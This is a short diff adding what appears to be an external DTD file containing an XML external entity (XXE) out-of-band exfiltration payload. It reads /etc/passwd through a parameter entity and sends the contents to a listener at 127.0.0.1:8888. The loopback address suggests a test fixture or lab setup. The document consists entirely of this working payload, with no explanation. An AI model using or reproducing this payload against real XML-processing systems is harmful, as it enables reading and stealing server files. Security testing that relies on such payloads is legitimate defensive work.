@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://127.0.0.1:8888/?data=%file;'>">
+%eval;
+%exfil;
